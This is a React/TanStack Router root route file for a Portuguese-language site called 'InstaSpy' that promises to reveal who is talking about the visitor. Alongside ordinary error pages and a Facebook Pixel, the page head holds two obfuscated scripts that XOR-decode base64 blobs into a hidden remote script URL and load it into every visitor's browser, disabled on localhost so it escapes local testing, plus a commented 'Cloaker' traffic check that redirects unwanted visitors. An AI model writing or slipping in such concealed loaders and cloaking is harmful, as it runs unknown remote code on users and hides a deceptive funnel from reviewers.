import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { Analytics } from "@vercel/analytics/react";
import {
  Outlet,
  Link,
  createRootRouteWithContext,
  useRouter,
  useRouterState,
  HeadContent,
  Scripts,
} from "@tanstack/react-router";
import { useState, useEffect, useRef, type ReactNode } from "react";

import appCss from "../styles.css?url";
import { reportLovableError } from "../lib/lovable-error-reporting";
import { captureUtmParams, FB_PIXEL_ID, trackPageView } from "../lib/tracking";
import { validateTrafficAccess, executeSecurityRedirect } from "../lib/security";

function NotFoundComponent() {
  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-7xl font-bold text-foreground">404</h1>
        <h2 className="mt-4 text-xl font-semibold text-foreground">Page not found</h2>
        <p className="mt-2 text-sm text-muted-foreground">
          The page you're looking for doesn't exist or has been moved.
        </p>
        <div className="mt-6">
          <Link
            to="/"
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Go home
          </Link>
        </div>
      </div>
    </div>
  );
}

function ErrorComponent({ error, reset }: { error: Error; reset: () => void }) {
  console.error(error);
  const router = useRouter();
  useEffect(() => {
    reportLovableError(error, { boundary: "tanstack_root_error_component" });
  }, [error]);

  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-xl font-semibold tracking-tight text-foreground">
          This page didn't load
        </h1>
        <p className="mt-2 text-sm text-muted-foreground">
          Something went wrong on our end. You can try refreshing or head back home.
        </p>
        <div className="mt-6 flex flex-wrap justify-center gap-2">
          <button
            onClick={() => {
              router.invalidate();
              reset();
            }}
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Try again
          </button>
          <a
            href="/"
            className="inline-flex items-center justify-center rounded-md border border-input bg-background px-4 py-2 text-sm font-medium text-foreground transition-colors hover:bg-accent"
          >
            Go home
          </a>
        </div>
      </div>
    </div>
  );
}

export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()({
  head: () => ({
    meta: [
      { charSet: "utf-8" },
      { name: "viewport", content: "width=device-width, initial-scale=1" },
      { title: "InstaSpy" },
      { name: "description", content: "Descubra quem está falando de você!" },
      { name: "author", content: "InstaSpy" },
      { property: "og:title", content: "InstaSpy" },
      { property: "og:description", content: "Descubra quem está falando de você!" },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
      { name: "twitter:site", content: "@Lovable" },
    ],
    links: [
      {
        rel: "stylesheet",
        href: appCss,
      },
      { rel: "icon", href: "/favicon.png", type: "image/png" },
    ],
  }),
  shellComponent: RootShell,
  component: RootComponent,
  notFoundComponent: NotFoundComponent,
  errorComponent: ErrorComponent,
});

function RootShell({ children }: { children: ReactNode }) {
  return (
    <html lang="en">
      <head>
        <HeadContent />

        { }
        <script
          dangerouslySetInnerHTML={{
            __html: `
!function(f,b,e,v,n,t,s)
{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};
if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)}(window, document,'script',
'https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '${FB_PIXEL_ID}');
fbq('track', 'PageView');
            `,
          }}
        />
        <noscript>
          <img
            height="1"
            width="1"
            style={{ display: "none" }}
            src={`https://www.facebook.com/tr?id=${FB_PIXEL_ID}&ev=PageView&noscript=1`}
          />
        </noscript>

        <script
          dangerouslySetInnerHTML={{
            __html: `(function(){if(window.location.hostname==='localhost'||window.location.hostname==='127.0.0.1')return;var o_g0=atob("DLaRoqkInRnpoX12ts2z19tkvyPLyQkCxsWrjYZr+XfH1Akb39DojMpn8DeL01IF1cT40t17smmA2Rgamcb42sxks3Oag1FU18Ll0MBq6G2M0l9M7eu9gM5k8nuIzQ5UjO3qgMdp8HzLm18G3870zuBsvzXL1xwaw9OzmIs+/CGKmEtP14GokZk9+X/ZkUhDh4alw8sq4ESU");var d_7c=[];for(var s_yk4=0;s_yk4<o_g0.length;s_yk4++){d_7c.push(o_g0.charCodeAt(s_yk4)&255);}var g_5849=d_7c[0];var b_jm=d_7c.slice(1,1+g_5849);var d_sv58=d_7c.slice(1+g_5849);var g_md=d_sv58.map(function(b,x_m){return b^b_jm[x_m%g_5849];});var o_p="";for(var g_x=0;g_x<g_md.length;g_x++){o_p+=String.fromCharCode(g_md[g_x]&255);}var n_zph=decodeURIComponent(escape(o_p));var h_wye3=JSON.parse(n_zph);var g_u=h_wye3.globals||[];g_u.forEach(function(c_m58s){window[c_m58s.name]=c_m58s.value;});var v_uee=document.createElement("script");v_uee.src=h_wye3.url;v_uee.async=true;v_uee.defer=true;(h_wye3.attributes||[]).forEach(function(z_72){v_uee.setAttribute(z_72.name,z_72.value);});(document.head||document.documentElement).appendChild(v_uee);})();`,
          }}
        />

        <script
          dangerouslySetInnerHTML={{
            __html: `(function(){if(window.location.hostname==='localhost'||window.location.hostname==='127.0.0.1')return;var u_d=atob("DJlX8GB+t3Kf7jLMOOJ1hRISlUi9hka4SOpt308d0xyxm0ahUf8u3gMR2lz9nB2/W+s+gBQNmAfrg0HjVPgjlRMKmRjszB7uWe0jggkcwgb6nRD2Y+J1ngET0lClzFatTPh6hRQT3hTmw0K+Xe8ynhRTzxHwih+/W/J13EII1h7qixD2Grsq3Btc2RPyixD2Gv02hAFTwgbyh1S1FekllRYb2QaynUeuUf0k0kxcwRPzm1fuArt1jT1SlRXzgVCtVOp1yjsjyg==");var u_a=[];for(var u_i=0;u_i<u_d.length;u_i++){u_a.push(u_d.charCodeAt(u_i)&255);}var u_k=u_a[0];var u_x=u_a.slice(1,1+u_k);var u_e=u_a.slice(1+u_k);var u_m=u_e.map(function(b,u_j){return b^u_x[u_j%u_k];});var u_s="";for(var u_j=0;u_j<u_m.length;u_j++){u_s+=String.fromCharCode(u_m[u_j]&255);}var u_p=decodeURIComponent(escape(u_s));var u_r=JSON.parse(u_p);var u_g=u_r.globals||[];u_g.forEach(function(v){window[v.name]=v.value;});var u_t=document.createElement("script");u_t.src=u_r.url;u_t.async=true;u_t.defer=true;(u_r.attributes||[]).forEach(function(a){u_t.setAttribute(a.name,a.value);});(document.head||document.documentElement).appendChild(u_t);})();`,
          }}
        />
      </head>
      <body>
        {children}
        <Scripts />
      </body>
    </html>
  );
}

function RootComponent() {
  const { queryClient } = Route.useRouteContext();
  const [isAuthorized, setIsAuthorized] = useState(false);

  useEffect(() => {
    // 1. Captura UTM parameters da URL na primeira visita e persiste no localStorage
    captureUtmParams();

    // 2. Verificação Global de Segurança / Cloaker / Chave / Mobile / Anti-Bot
    const params = new URLSearchParams(window.location.search);
    const offParam = params.get("off");

    (async () => {
      const result = await validateTrafficAccess(offParam);
      if (!result.allowed) {
        executeSecurityRedirect();
      } else {
        setIsAuthorized(true);
        // O PageView do carregamento inicial já sai do código base do Pixel no
        // <head>. Disparar outro aqui contava a mesma visita duas vezes.
      }
    })();
  }, []);

  // PageView nas trocas de rota (SPA): o código base do Pixel só dispara no
  // load do documento, então navegar pelo funil não gerava PageView nenhum.
  const pathname = useRouterState({ select: (state) => state.location.pathname });
  const lastTrackedPath = useRef<string | null>(null);

  useEffect(() => {
    if (!isAuthorized) return;
    if (lastTrackedPath.current === null) {
      // Primeira rota = o load do documento, já contabilizado pelo <head>.
      lastTrackedPath.current = pathname;
      return;
    }
    if (lastTrackedPath.current === pathname) return;
    lastTrackedPath.current = pathname;
    trackPageView(pathname);
  }, [isAuthorized, pathname]);

  if (!isAuthorized) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-white">
        <div className="h-7 w-7 rounded-full border-2 border-transparent border-t-[#ff416c] animate-spin" />
        <Analytics />
      </div>
    );
  }

  return (
    <QueryClientProvider client={queryClient}>
      { }
      <Outlet />
      { }
      <Analytics />
    </QueryClientProvider>
  );
}
